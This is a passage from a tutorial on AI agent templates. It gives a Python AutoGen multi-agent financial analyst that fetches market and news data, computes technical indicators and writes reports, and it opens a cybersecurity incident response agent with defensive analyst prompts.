                "limit_memory": "4Gi",
                "limit_cpu": "2"
            }
        }
    
    return ti
```

This stack is particularly well-suited for organizations that need to:

- Integrate AI agents with enterprise data platforms
- Schedule complex AI agent workflows
- Maintain compliance and governance
- Track AI agent performance over time
- Support data-intensive AI processes

## 4. AI Agent Templates for Real-World Applications

### AI-Driven Financial Analyst (Market Data Analysis & Forecasting)

This AI agent template is designed to analyze financial market data, identify trends, and provide forecasting and investment recommendations. It combines market data analysis, sentiment evaluation from news sources, and technical analysis to generate comprehensive financial insights.

**Core Capabilities:**
- Historical price analysis and pattern recognition
- Sector and company fundamental analysis
- News sentiment integration for market context
- Technical indicator calculation and interpretation
- Investment recommendation generation
- Report creation with visualizations

**Architecture:**

![Financial Analyst Agent Architecture](https://i.imgur.com/wZh8vKn.png)

**Implementation Example:**

```python
# financial_analyst_agent.py
import datetime
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import yfinance as yf
import autogen
from autogen.agentchat.contrib.gpt_assistant_agent import GPTAssistantAgent
import json
import requests
import os
from typing import Dict, List, Any, Optional, Union, Tuple

# Configure API keys and settings
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "your-api-key")
ALPHA_VANTAGE_API_KEY = os.environ.get("ALPHA_VANTAGE_API_KEY", "your-api-key")
NEWS_API_KEY = os.environ.get("NEWS_API_KEY", "your-api-key")

# Initialize OpenAI client
import openai
client = openai.OpenAI(api_key=OPENAI_API_KEY)

class FinancialAnalystAgent:
    """
    An AI-driven financial analyst agent that provides comprehensive market analysis,
    trend identification, and investment recommendations.
    """
    
    def __init__(self, config=None):
        """
        Initialize the Financial Analyst Agent.
        
        Args:
            config: Optional configuration dictionary
        """
        self.config = config or {}
        
        # Set up agent configuration
        self.llm_config = {
            "config_list": [{"model": "gpt-4-turbo", "api_key": OPENAI_API_KEY}],
            "temperature": 0.2,
            "cache_seed": None  # Disable caching for financial data which changes frequently
        }
        
        # Create the agent team
        self._create_agent_team()
        
        # Data cache
        self.data_cache = {}
    
    def _create_agent_team(self):
        """Create the team of specialized agents for financial analysis."""
        
        # 1. Market Analyst - Specialized in general market trends and sector analysis
        self.market_analyst = autogen.AssistantAgent(
            name="MarketAnalyst",
            system_message="""You are an expert market analyst who specializes in understanding broad market trends, 
            sector rotations, and macroeconomic factors affecting financial markets.
            
            Your responsibilities:
            1. Analyze overall market conditions and trends
            2. Identify sector strengths and weaknesses
            3. Interpret macroeconomic data and its market impact
            4. Provide context for market movements
            5. Identify market sentiment and risk factors
            
            Always base your analysis on data and established financial theories. Avoid speculation without evidence.
            Present a balanced view that considers both bullish and bearish perspectives.""",
            llm_config=self.llm_config
        )
        
        # 2. Technical Analyst - Specialized in chart patterns and technical indicators
        self.technical_analyst = autogen.AssistantAgent(
            name="TechnicalAnalyst",
            system_message="""You are an expert technical analyst who specializes in chart patterns, technical indicators,
            and price action analysis for financial markets.
            
            Your responsibilities:
            1. Analyze price charts for significant patterns
            2. Calculate and interpret technical indicators
            3. Identify support and resistance levels
            4. Analyze volume patterns and their implications
            5. Provide technical-based forecasts
            
            Focus on objective technical analysis principles. Clearly explain the reasoning behind your analysis and 
            the historical reliability of the patterns you identify. Always consider multiple timeframes.""",
            llm_config={
                **self.llm_config,
                "functions": [
                    {
                        "name": "calculate_technical_indicators",
                        "description": "Calculate technical indicators for a stock",
                        "parameters": {
                            "type": "object",
                            "properties": {
                                "symbol": {"type": "string", "description": "Stock symbol"},
                                "indicators": {"type": "array", "items": {"type": "string"}, "description": "List of indicators to calculate"},
                                "period": {"type": "string", "description": "Time period for analysis (e.g., '1y', '6mo', '3mo')"}
                            },
                            "required": ["symbol", "indicators"]
                        }
                    }
                ]
            }
        )
        
        # 3. Fundamental Analyst - Specialized in company financial data
        self.fundamental_analyst = autogen.AssistantAgent(
            name="FundamentalAnalyst",
            system_message="""You are an expert fundamental analyst who specializes in analyzing company financial statements,
            valuation metrics, and business models.
            
            Your responsibilities:
            1. Analyze company financial health and performance
            2. Evaluate valuation metrics against industry peers
            3. Assess growth prospects and business model strengths
            4. Identify financial risks and opportunities
            5. Provide fundamental-based investment recommendations
            
            Always use established valuation methodologies and accounting principles. Compare companies to their 
            historical performance, sector peers, and the broader market. Consider both quantitative metrics 
            and qualitative factors.""",
            llm_config=self.llm_config
        )
        
        # 4. News Sentiment Analyst - Specialized in news and social media sentiment
        self.sentiment_analyst = autogen.AssistantAgent(
            name="SentimentAnalyst",
            system_message="""You are an expert in analyzing news and social media sentiment related to financial markets
            and individual companies.
            
            Your responsibilities:
            1. Evaluate news sentiment affecting markets or specific stocks
            2. Identify important news catalysts and their potential impact
            3. Detect shifts in market narrative or sentiment
            4. Assess information sources for reliability and importance
            5. Contextualize news within broader market trends
            
            Focus on objective analysis of sentiment. Distinguish between substantive news and market noise.
            Consider the historical impact of similar news events and sentiment shifts.""",
            llm_config=self.llm_config
        )
        
        # 5. Portfolio Advisor - Specialized in investment recommendations
        self.portfolio_advisor = autogen.AssistantAgent(
            name="PortfolioAdvisor",
            system_message="""You are an expert investment advisor who specializes in portfolio construction,
            risk management, and investment recommendations.
            
            Your responsibilities:
            1. Synthesize analyses from other specialists into actionable advice
            2. Provide specific investment recommendations with rationales
            3. Consider risk management and portfolio allocation
            4. Present balanced bull/bear cases for investments
            5. Contextualize recommendations for different investor profiles
            
            Always include risk factors alongside potential rewards. Provide specific time horizons
            for recommendations when possible. Consider multiple scenarios and their implications.
            Make specific, actionable recommendations rather than general statements.""",
            llm_config=self.llm_config
        )
        
        # 6. Report Writer - Specialized in creating comprehensive reports
        self.report_writer = autogen.AssistantAgent(
            name="ReportWriter",
            system_message="""You are an expert financial report writer who specializes in synthesizing complex
            financial analyses into clear, structured reports.
            
            Your responsibilities:
            1. Organize analyses into a coherent narrative
            2. Create executive summaries that highlight key points
            3. Structure information logically with appropriate sections
            4. Maintain professional financial writing standards
            5. Ensure reports are comprehensive yet accessible
            
            Use clear financial terminology and explain complex concepts when necessary. Include all relevant
            information while avoiding unnecessary repetition. Organize content with appropriate headings
            and structure. Always include an executive summary and conclusion.""",
            llm_config=self.llm_config
        )
        
        # User proxy agent for orchestrating the workflow
        self.user_proxy = autogen.UserProxyAgent(
            name="FinancialDataManager",
            human_input_mode="NEVER",
            code_execution_config={
                "work_dir": "financial_analysis_workspace",
                "use_docker": False,
                "last_n_messages": 3
            },
            system_message="""You are a financial data manager that coordinates the financial analysis process.
            Your role is to gather data, distribute it to the specialized analysts, and compile their insights.
            You can execute Python code to fetch and process financial data."""
        )
    
    def fetch_market_data(self, symbols: List[str], period: str = "1y") -> Dict[str, pd.DataFrame]:
        """
        Fetch market data for specified symbols.
        
        Args:
            symbols: List of stock symbols
            period: Time period for data (e.g., '1d', '5d', '1mo', '3mo', '6mo', '1y', '2y', '5y', '10y', 'ytd', 'max')
            
        Returns:
            Dictionary of DataFrames with market data
        """
        results = {}
        
        # Check cache first
        cache_key = f"{','.join(symbols)}_{period}"
        if cache_key in self.data_cache:
            return self.data_cache[cache_key]
        
        # Fetch data for each symbol
        for symbol in symbols:
            try:
                stock = yf.Ticker(symbol)
                hist = stock.history(period=period)
                
                if not hist.empty:
                    results[symbol] = hist
                    
                    # Calculate returns
                    hist['Daily_Return'] = hist['Close'].pct_change()
                    hist['Cumulative_Return'] = (1 + hist['Daily_Return']).cumprod() - 1
                    
                    # Calculate volatility (20-day rolling standard deviation of returns)
                    hist['Volatility_20d'] = hist['Daily_Return'].rolling(window=20).std()
                    
                    # Add some basic technical indicators
                    # 20-day and 50-day moving averages
                    hist['MA20'] = hist['Close'].rolling(window=20).mean()
                    hist['MA50'] = hist['Close'].rolling(window=50).mean()
                    
                    # Relative Strength Index (RSI)
                    delta = hist['Close'].diff()
                    gain = (delta.where(delta > 0, 0)).rolling(window=14).mean()
                    loss = (-delta.where(delta < 0, 0)).rolling(window=14).mean()
                    rs = gain / loss
                    hist['RSI'] = 100 - (100 / (1 + rs))
                    
                    results[symbol] = hist
            except Exception as e:
                print(f"Error fetching data for {symbol}: {e}")
        
        # Store in cache
        self.data_cache[cache_key] = results
        
        return results
    
    def fetch_fundamental_data(self, symbols: List[str]) -> Dict[str, Dict[str, Any]]:
        """
        Fetch fundamental data for specified symbols.
        
        Args:
            symbols: List of stock symbols
            
        Returns:
            Dictionary of fundamental data by symbol
        """
        results = {}
        
        for symbol in symbols:
            try:
                stock = yf.Ticker(symbol)
                
                # Get key statistics
                info = stock.info
                
                # Get financial data
                try:
                    income_stmt = stock.income_stmt
                    balance_sheet = stock.balance_sheet
                    cash_flow = stock.cashflow
                    
                    financials = {
                        "income_statement": income_stmt.to_dict() if not income_stmt.empty else {},
                        "balance_sheet": balance_sheet.to_dict() if not balance_sheet.empty else {},
                        "cash_flow": cash_flow.to_dict() if not cash_flow.empty else {}
                    }
                except:
                    financials = {}
                
                # Compile results
                results[symbol] = {
                    "info": info,
                    "financials": financials
                }
            except Exception as e:
                print(f"Error fetching fundamental data for {symbol}: {e}")
        
        return results
    
    def fetch_news_data(self, symbols: List[str], days: int = 7) -> Dict[str, List[Dict[str, Any]]]:
        """
        Fetch news articles for specified symbols.
        
        Args:
            symbols: List of stock symbols
            days: Number of days to look back
            
        Returns:
            Dictionary of news articles by symbol
        """
        results = {}
        
        for symbol in symbols:
            try:
                # Format date range
                end_date = datetime.datetime.now()
                start_date = end_date - datetime.timedelta(days=days)
                
                # Get company name for better search results
                company_name = ""
                try:
                    stock = yf.Ticker(symbol)
                    company_name = stock.info.get("shortName", symbol)
                except:
                    company_name = symbol
                
                # Construct query
                query = f"{company_name} OR {symbol} stock"
                
                # Fetch news from NewsAPI
                url = (f"https://newsapi.org/v2/everything?"
                       f"q={query}&"
                       f"from={start_date.strftime('%Y-%m-%d')}&"
                       f"to={end_date.strftime('%Y-%m-%d')}&"
                       f"language=en&"
                       f"sortBy=relevancy&"
                       f"pageSize=10&"
                       f"apiKey={NEWS_API_KEY}")
                
                response = requests.get(url)
                if response.status_code == 200:
                    news_data = response.json()
                    articles = news_data.get("articles", [])
                    
                    # Process articles
                    processed_articles = []
                    for article in articles:
                        processed_articles.append({
                            "title": article.get("title", ""),
                            "source": article.get("source", {}).get("name", ""),
                            "published_at": article.get("publishedAt", ""),
                            "url": article.get("url", ""),
                            "description": article.get("description", "")
                        })
                    
                    results[symbol] = processed_articles
                else:
                    print(f"Error fetching news for {symbol}: {response.status_code}")
                    results[symbol] = []
            except Exception as e:
                print(f"Error fetching news for {symbol}: {e}")
                results[symbol] = []
        
        return results
    
    def calculate_technical_indicators(self, symbol: str, indicators: List[str], period: str = "1y") -> Dict[str, Any]:
        """
        Calculate technical indicators for a stock.
        
        Args:
            symbol: Stock symbol
            indicators: List of indicators to calculate
            period: Time period for data
            
        Returns:
            Dictionary of technical indicators
        """
        try:
            # Fetch data
            data = self.fetch_market_data([symbol], period).get(symbol)
            if data is None or data.empty:
                return {"error": f"No data available for {symbol}"}
            
            results = {}
            
            for indicator in indicators:
                indicator = indicator.lower()
                
                # Moving Averages
                if indicator.startswith("ma") or indicator.startswith("sma"):
                    try:
                        # Extract window size from indicator name (e.g., "ma20" -> 20)
                        window = int(indicator[2:]) if indicator.startswith("ma") else int(indicator[3:])
                        data[f'MA{window}'] = data['Close'].rolling(window=window).mean()
                        # Get the most recent value
                        latest_value = data[f'MA{window}'].iloc[-1]
                        results[f'MA{window}'] = latest_value
                    except:
                        results[f'{indicator}'] = None
                
                # Exponential Moving Average
                elif indicator.startswith("ema"):
                    try:
                        window = int(indicator[3:])
                        data[f'EMA{window}'] = data['Close'].ewm(span=window, adjust=False).mean()
                        latest_value = data[f'EMA{window}'].iloc[-1]
                        results[f'EMA{window}'] = latest_value
                    except:
                        results[f'{indicator}'] = None
                
                # RSI - Relative Strength Index
                elif indicator == "rsi":
                    try:
                        delta = data['Close'].diff()
                        gain = (delta.where(delta > 0, 0)).rolling(window=14).mean()
                        loss = (-delta.where(delta < 0, 0)).rolling(window=14).mean()
                        rs = gain / loss
                        data['RSI'] = 100 - (100 / (1 + rs))
                        latest_value = data['RSI'].iloc[-1]
                        results['RSI'] = latest_value
                    except:
                        results['RSI'] = None
                
                # MACD - Moving Average Convergence Divergence
                elif indicator == "macd":
                    try:
                        exp1 = data['Close'].ewm(span=12, adjust=False).mean()
                        exp2 = data['Close'].ewm(span=26, adjust=False).mean()
                        data['MACD'] = exp1 - exp2
                        data['Signal_Line'] = data['MACD'].ewm(span=9, adjust=False).mean()
                        data['MACD_Histogram'] = data['MACD'] - data['Signal_Line']
                        
                        results['MACD'] = {
                            'MACD_Line': data['MACD'].iloc[-1],
                            'Signal_Line': data['Signal_Line'].iloc[-1],
                            'Histogram': data['MACD_Histogram'].iloc[-1]
                        }
                    except:
                        results['MACD'] = None
                
                # Bollinger Bands
                elif indicator == "bollinger" or indicator == "bb":
                    try:
                        window = 20
                        data['MA20'] = data['Close'].rolling(window=window).mean()
                        data['BB_Upper'] = data['MA20'] + (data['Close'].rolling(window=window).std() * 2)
                        data['BB_Lower'] = data['MA20'] - (data['Close'].rolling(window=window).std() * 2)
                        
                        results['Bollinger_Bands'] = {
                            'Upper': data['BB_Upper'].iloc[-1],
                            'Middle': data['MA20'].iloc[-1],
                            'Lower': data['BB_Lower'].iloc[-1],
                            'Width': (data['BB_Upper'].iloc[-1] - data['BB_Lower'].iloc[-1]) / data['MA20'].iloc[-1]
                        }
                    except:
                        results['Bollinger_Bands'] = None
                
                # Average True Range (ATR)
                elif indicator == "atr":
                    try:
                        high_low = data['High'] - data['Low']
                        high_close = (data['High'] - data['Close'].shift()).abs()
                        low_close = (data['Low'] - data['Close'].shift()).abs()
                        ranges = pd.concat([high_low, high_close, low_close], axis=1)
                        true_range = ranges.max(axis=1)
                        data['ATR'] = true_range.rolling(14).mean()
                        latest_value = data['ATR'].iloc[-1]
                        results['ATR'] = latest_value
                    except:
                        results['ATR'] = None
                
                # Volume-Weighted Average Price (VWAP)
                elif indicator == "vwap":
                    try:
                        typical_price = (data['High'] + data['Low'] + data['Close']) / 3
                        data['VWAP'] = (typical_price * data['Volume']).cumsum() / data['Volume'].cumsum()
                        latest_value = data['VWAP'].iloc[-1]
                        results['VWAP'] = latest_value
                    except:
                        results['VWAP'] = None
            
            # Add the current price for reference
            results['Current_Price'] = data['Close'].iloc[-1]
            
            return results
            
        except Exception as e:
            return {"error": str(e)}
    
    def analyze_stock(
        self, 
        symbol: str, 
        period: str = "1y", 
        include_news: bool = True,
        include_fundamentals: bool = True,
        report_type: str = "standard"
    ) -> Dict[str, Any]:
        """
        Perform a comprehensive analysis of a stock.
        
        Args:
            symbol: Stock symbol to analyze
            period: Time period for analysis
            include_news: Whether to include news analysis
            include_fundamentals: Whether to include fundamental analysis
            report_type: Type of report (standard, detailed, executive)
            
        Returns:
            Dictionary with comprehensive analysis
        """
        # Gather data
        market_data = self.fetch_market_data([symbol], period)
        
        # Create group chat for agent collaboration
        groupchat = autogen.GroupChat(
            agents=[
                self.user_proxy, 
                self.market_analyst, 
                self.technical_analyst, 
                self.fundamental_analyst,
                self.sentiment_analyst,
                self.portfolio_advisor,
                self.report_writer
            ],
            messages=[],
            max_round=12
        )
        
        manager = autogen.GroupChatManager(groupchat=groupchat)
        
        # Prepare market data for agents
        if symbol in market_data:
            df = market_data[symbol]
            
            # Create price summary
            price_start = df['Close'].iloc[0]
            price_end = df['Close'].iloc[-1]
            price_change = price_end - price_start
            price_change_pct = (price_change / price_start) * 100
            price_high = df['High'].max()
            price_low = df['Low'].min()
            
            price_summary = f"""
            Stock: {symbol}
            Period: {period}
            Starting Price: ${price_start:.2f}
            Current Price: ${price_end:.2f}
            Price Change: ${price_change:.2f} ({price_change_pct:.2f}%)
            Period High: ${price_high:.2f}
            Period Low: ${price_low:.2f}
            Trading Volume (Avg): {df['Volume'].mean():.0f}
            """
            
            # Calculate key technical indicators
            tech_indicators = self.calculate_technical_indicators(
                symbol, 
                ["ma20", "ma50", "ma200", "rsi", "macd", "bollinger"],
                period
            )
            
            # Convert indicators to string format
            indicators_str = json.dumps(tech_indicators, indent=2)
            
            # Get fundamental data if requested
            fundamentals_str = ""
            if include_fundamentals:
                fundamental_data = self.fetch_fundamental_data([symbol])
                if symbol in fundamental_data:
                    # Extract key metrics
                    info = fundamental_data[symbol].get("info", {})
                    fundamentals_str = f"""
                    Market Cap: {info.get('marketCap', 'N/A')}
                    P/E Ratio: {info.get('trailingPE', 'N/A')}
                    EPS: {info.get('trailingEps', 'N/A')}
                    Beta: {info.get('beta', 'N/A')}
                    52 Week High: {info.get('fiftyTwoWeekHigh', 'N/A')}
                    52 Week Low: {info.get('fiftyTwoWeekLow', 'N/A')}
                    Dividend Yield: {info.get('dividendYield', 'N/A')}
                    Industry: {info.get('industry', 'N/A')}
                    Sector: {info.get('sector', 'N/A')}
                    """
            
            # Get news data if requested
            news_str = ""
            if include_news:
                news_data = self.fetch_news_data([symbol], days=15)
                if symbol in news_data and news_data[symbol]:
                    news_str = "Recent News:\n"
                    for i, article in enumerate(news_data[symbol][:5], 1):
                        news_str += f"""
                        {i}. {article.get('title', 'N/A')}
                        Source: {article.get('source', 'N/A')}
                        Date: {article.get('published_at', 'N/A')}
                        Summary: {article.get('description', 'N/A')}
                        """
            
            # Generate initial prompt for the agent team
            analysis_prompt = f"""
            Please analyze the following stock: {symbol}
            
            TIME PERIOD: {period}
            
            PRICE SUMMARY:
            {price_summary}
            
            TECHNICAL INDICATORS:
            {indicators_str}
            """
            
            if fundamentals_str:
                analysis_prompt += f"""
                FUNDAMENTAL DATA:
                {fundamentals_str}
                """
            
            if news_str:
                analysis_prompt += f"""
                NEWS:
                {news_str}
                """
            
            analysis_prompt += f"""
            Please provide a {report_type} analysis report that includes:
            1. Technical Analysis - Key patterns, indicators, and potential price targets
            2. Market Context - How the stock fits in the broader market environment
            {"3. Fundamental Analysis - Company financial health and valuation" if include_fundamentals else ""}
            {"4. News Sentiment Analysis - Impact of recent news" if include_news else ""}
            5. Investment Recommendation - Clear buy/hold/sell guidance with time horizon
            6. Risk Assessment - Key risks and considerations
            
            The MarketAnalyst should begin by providing market context.
            The TechnicalAnalyst should analyze price patterns and indicators.
            The FundamentalAnalyst should assess the company's financial health and valuation.
            The SentimentAnalyst should evaluate recent news and sentiment.
            The PortfolioAdvisor should synthesize these analyses into investment recommendations.
            Finally, the ReportWriter should compile a well-structured professional report.
            """
            
            # Start the group chat
            result = self.user_proxy.initiate_chat(
                manager,
                message=analysis_prompt
            )
            
            # Extract the final report
            final_report = None
            for message in reversed(self.user_proxy.chat_history):
                if message['role'] == 'assistant' and 'ReportWriter' in message.get('name', ''):
                    final_report = message['content']
                    break
            
            if not final_report:
                # Use the last substantial response if no clear report
                for message in reversed(self.user_proxy.chat_history):
                    if message['role'] == 'assistant' and len(message['content']) > 500:
                        final_report = message['content']
                        break
            
            return {
                "symbol": symbol,
                "analysis_date": datetime.datetime.now().strftime("%Y-%m-%d"),
                "period": period,
                "report_type": report_type,
                "price_data": {
                    "current_price": price_end,
                    "price_change": price_change,
                    "price_change_pct": price_change_pct,
                    "period_high": price_high,
                    "period_low": price_low
                },
                "technical_indicators": tech_indicators,
                "report": final_report
            }
        else:
            return {"error": f"No data available for {symbol}"}

    def compare_stocks(
        self, 
        symbols: List[str], 
        period: str = "1y",
        report_type: str = "standard"
    ) -> Dict[str, Any]:
        """
        Compare multiple stocks and provide analysis.
        
        Args:
            symbols: List of stock symbols to compare
            period: Time period for analysis
            report_type: Type of report (standard, detailed, executive)
            
        Returns:
            Dictionary with comparative analysis
        """
        if len(symbols) < 2:
            return {"error": "Please provide at least two symbols for comparison"}
        
        # Gather data for all symbols
        market_data = self.fetch_market_data(symbols, period)
        
        # Create group chat for agent collaboration
        groupchat = autogen.GroupChat(
            agents=[
                self.user_proxy, 
                self.market_analyst, 
                self.technical_analyst, 
                self.fundamental_analyst,
                self.portfolio_advisor,
                self.report_writer
            ],
            messages=[],
            max_round=12
        )
        
        manager = autogen.GroupChatManager(groupchat=groupchat)
        
        # Prepare comparative data
        comparison_data = {}
        price_performance = {}
        missing_data = []
        
        for symbol in symbols:
            if symbol in market_data and not market_data[symbol].empty:
                df = market_data[symbol]
                
                # Calculate performance metrics
                price_start = df['Close'].iloc[0]
                price_end = df['Close'].iloc[-1]
                price_change_pct = ((price_end / price_start) - 1) * 100
                
                # Calculate volatility (standard deviation of returns)
                volatility = df['Daily_Return'].std() * 100  # Multiply by 100 for percentage
                
                # Calculate max drawdown
                rolling_max = df['Close'].cummax()
                drawdown = (df['Close'] / rolling_max - 1) * 100
                max_drawdown = drawdown.min()
                
                # Normalize price series (starting at 100)
                normalized_price = (df['Close'] / df['Close'].iloc[0]) * 100
                
                # Store metrics
                price_performance[symbol] = {
                    "price_change_pct": price_change_pct,
                    "current_price": price_end,
                    "volatility": volatility,
                    "max_drawdown": max_drawdown,
                    "normalized_prices": normalized_price.tolist()
                }
                
                # Calculate key technical indicators
                tech_indicators = self.calculate_technical_indicators(
                    symbol, 
                    ["ma50", "rsi", "macd"],
                    period
                )
                
                # Add to comparison data
                comparison_data[symbol] = {
                    "performance": price_performance[symbol],
                    "technical_indicators": tech_indicators
                }
            else:
                missing_data.append(symbol)
        
        # Generate comparative analysis prompt
        if comparison_data:
            # Sort symbols by performance
            sorted_symbols = sorted(
                comparison_data.keys(),
                key=lambda x: comparison_data[x]["performance"]["price_change_pct"],
                reverse=True
            )
            
            # Create performance table
            performance_table = "Symbol | Price Change (%) | Volatility (%) | Max Drawdown (%)\n"
            performance_table += "-------|------------------|----------------|----------------\n"
            
            for symbol in sorted_symbols:
                perf = comparison_data[symbol]["performance"]
                performance_table += f"{symbol} | {perf['price_change_pct']:.2f}% | {perf['volatility']:.2f}% | {perf['max_drawdown']:.2f}%\n"
            
            # Create comparative prompt
            comparison_prompt = f"""
            Please perform a comparative analysis of the following stocks: {', '.join(symbols)}
            
            TIME PERIOD: {period}
            
            PERFORMANCE COMPARISON:
            {performance_table}
            
            TECHNICAL INDICATORS SUMMARY:
            """
            
            # Add technical indicators
            for symbol in sorted_symbols:
                tech = comparison_data[symbol]["technical_indicators"]
                comparison_prompt += f"\n{symbol} Indicators:\n"
                comparison_prompt += json.dumps(tech, indent=2) + "\n"
            
            if missing_data:
                comparison_prompt += f"\nNOTE: Could not fetch data for these symbols: {', '.join(missing_data)}\n"
            
            comparison_prompt += f"""
            Please provide a {report_type} comparative analysis report that includes:
            
            1. Performance Comparison - Compare the stocks' performance during the period
            2. Relative Strength Analysis - Which stocks show relative strength and weakness
            3. Correlation Analysis - How these stocks move in relation to each other
            4. Technical Position - Compare the technical position of each stock
            5. Ranked Recommendations - Rank the stocks from most to least favorable
            6. Portfolio Considerations - How these stocks might work together in a portfolio
            
            The MarketAnalyst should analyze the market context and relative performance.
            The TechnicalAnalyst should compare technical positions.
            The FundamentalAnalyst should provide comparative fundamental context if relevant.
            The PortfolioAdvisor should rank the stocks and provide portfolio recommendations.
            Finally, the ReportWriter should compile a well-structured comparative report.
            """
            
            # Start the group chat
            result = self.user_proxy.initiate_chat(
                manager,
                message=comparison_prompt
            )
            
            # Extract the final report
            final_report = None
            for message in reversed(self.user_proxy.chat_history):
                if message['role'] == 'assistant' and 'ReportWriter' in message.get('name', ''):
                    final_report = message['content']
                    break
            
            if not final_report:
                # Use the last substantial response if no clear report
                for message in reversed(self.user_proxy.chat_history):
                    if message['role'] == 'assistant' and len(message['content']) > 500:
                        final_report = message['content']
                        break
            
            return {
                "symbols": symbols,
                "analysis_date": datetime.datetime.now().strftime("%Y-%m-%d"),
                "period": period,
                "report_type": report_type,
                "performance_comparison": {symbol: comparison_data[symbol]["performance"] for symbol in comparison_data},
                "missing_data": missing_data,
                "report": final_report
            }
        else:
            return {"error": "Could not fetch data for any of the provided symbols"}

# Example usage
if __name__ == "__main__":
    # Create the financial analyst agent
    financial_analyst = FinancialAnalystAgent()
    
    # Analyze a single stock
    analysis = financial_analyst.analyze_stock(
        symbol="MSFT",
        period="1y",
        include_news=True,
        report_type="standard"
    )
    
    print("=== Single Stock Analysis ===")
    print(f"Symbol: {analysis['symbol']}")
    print(f"Current Price: ${analysis['price_data']['current_price']:.2f}")
    print(f"Price Change: {analysis['price_data']['price_change_pct']:.2f}%")
    print("\nReport Excerpt:")
    print(analysis['report'][:500] + "...\n")
    
    # Compare multiple stocks
    comparison = financial_analyst.compare_stocks(
        symbols=["AAPL", "MSFT", "GOOGL"],
        period="6mo",
        report_type="standard"
    )
    
    print("=== Stock Comparison ===")
    print(f"Symbols: {comparison['symbols']}")
    print("\nPerformance Comparison:")
    for symbol, perf in comparison['performance_comparison'].items():
        print(f"{symbol}: {perf['price_change_pct']:.2f}%")
    
    print("\nReport Excerpt:")
    print(comparison['report'][:500] + "...")
```

**Usage Example:**

```python
from financial_analyst_agent import FinancialAnalystAgent

# Initialize agent
analyst = FinancialAnalystAgent()

# Analyze a stock
report = analyst.analyze_stock(
    symbol="TSLA",
    period="1y",
    include_news=True,
    include_fundamentals=True,
    report_type="detailed"
)

print(f"Analysis of {report['symbol']} completed.")
print(f"Current price: ${report['price_data']['current_price']:.2f}")
print(f"Price change: {report['price_data']['price_change_pct']:.2f}%")
print("\nReport Highlights:")
print(report['report'])

# Compare multiple stocks
comparison = analyst.compare_stocks(
    symbols=["AAPL", "MSFT", "GOOGL", "AMZN", "META"],
    period="6mo",
    report_type="standard"
)

print("\nComparative Analysis:")
print(comparison['report'])
```

This AI Financial Analyst agent template demonstrates key enterprise patterns:

1. **Agent Specialization**: Different agents focus on specific analysis types (technical, fundamental, news)
2. **Data Pipeline Integration**: The system integrates multiple external data sources
3. **Collaborative Analysis**: Agents work together via a group chat to produce a comprehensive analysis
4. **Flexible Report Generation**: Different report types for various user needs
5. **Caching Strategy**: Data caching to improve performance and reduce redundant API calls

### AI-Powered Cybersecurity Incident Response (Threat Detection & Remediation)

This AI agent template is designed to help cybersecurity teams detect, analyze, and respond to security incidents. It combines threat intelligence, log analysis, and remediation guidance to provide comprehensive cybersecurity incident response.

**Core Capabilities:**
- Automated log analysis and threat detection
- Incident classification and severity assessment
- Threat intelligence correlation
- Forensic investigation support
- Guided remediation steps
- Documentation generation for compliance

**Architecture:**

![Cybersecurity Incident Response Agent Architecture](https://i.imgur.com/wGHFdTd.png)

**Implementation Example:**

```python
# cybersecurity_incident_response_agent.py
import os
import json
import datetime
import ipaddress
import hashlib
import re
import uuid
import pandas as pd
import numpy as np
import autogen
import requests
from typing import Dict, List, Any, Optional, Union, Tuple

# Configure API keys and settings
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "your-api-key")
VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY", "your-api-key")
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY", "your-api-key")

# Initialize OpenAI client
import openai
client = openai.OpenAI(api_key=OPENAI_API_KEY)

class CybersecurityIncidentResponseAgent:
    """
    An AI-powered cybersecurity incident response agent that helps detect,
    analyze, and respond to security incidents.
    """
    
    def __init__(self, config=None):
        """
        Initialize the Cybersecurity Incident Response Agent.
        
        Args:
            config: Optional configuration dictionary
        """
        self.config = config or {}
        
        # Set up agent configuration
        self.llm_config = {
            "config_list": [{"model": "gpt-4-turbo", "api_key": OPENAI_API_KEY}],
            "temperature": 0.2,
            "timeout": 120
        }
        
        # Create the agent team
        self._create_agent_team()
        
        # Threat intelligence cache
        self.threat_intel_cache = {}
    
    def _create_agent_team(self):
        """Create the team of specialized agents for cybersecurity incident response."""
        
        # 1. Threat Detector - Specialized in identifying threats from logs and data
        self.threat_detector = autogen.AssistantAgent(
            name="ThreatDetector",
            system_message="""You are an expert threat detection analyst who specializes in identifying security threats
            from logs, network traffic, and system data.
            
            Your responsibilities:
            1. Analyze raw logs and identify suspicious patterns or anomalies
            2. Recognize indicators of compromise (IoCs) such as unusual IP addresses, file hashes, or user behaviors
            3. Detect potential attack techniques and map them to the MITRE ATT&CK framework
            4. Identify false positives and prioritize genuine security concerns
            5. Alert on critical security issues with appropriate context
            
            Be thorough and methodical in your analysis. Look for subtle patterns that might indicate sophisticated
            attacks. Avoid jumping to conclusions without sufficient evidence. Always provide specific indicators
            and explain why they are suspicious.""",
            llm_config=self.llm_config
        )
        
        # 2. Forensic Investigator - Specialized in detailed investigation
        self.forensic_investigator = autogen.AssistantAgent(
            name="ForensicInvestigator",
            system_message="""You are an expert digital forensic investigator who specializes in analyzing security
            incidents to determine their scope, impact, and attribution.
            
            Your responsibilities:
            1. Analyze evidence thoroughly to reconstruct the incident timeline
            2. Identify the attack vectors and methods used by threat actors
            3. Determine the scope of compromise (affected systems, data, users)
            4. Look for persistence mechanisms and backdoors
            5. Gather indicators that can help with attribution
            
            Be methodical and detail-oriented in your investigation. Document your findings clearly, including timestamps
            and specific technical details. Distinguish between confirmed facts, strong evidence, and speculation.
            Consider alternative explanations and test your hypotheses against the evidence.""",
            llm_config=self.llm_config
        )
        
        # 3. Threat Intelligence Analyst - Specialized in external threat intelligence
        self.threat_intel_analyst = autogen.AssistantAgent(
            name="ThreatIntelAnalyst",
            system_message="""You are an expert threat intelligence analyst who specializes in researching and
            analyzing cyber threats, threat actors, and their tactics, techniques, and procedures (TTPs).
            
            Your responsibilities:
            1. Research indicators of compromise against threat intelligence sources
            2. Identify known threat actors or malware associated with the incident
            3. Provide context on the tactics, techniques, and procedures used
            4. Assess the potential goals and motivation of the attackers
            5. Determine if the attack is targeted or opportunistic
            
            Provide relevant, actionable intelligence that helps understand the threat. Link findings to the
            MITRE ATT&CK framework when possible. Distinguish between high and low-confidence assessments.
            Consider the reliability of intelligence sources. Focus on information that is directly relevant
            to the current incident.""",
            llm_config=self.llm_config
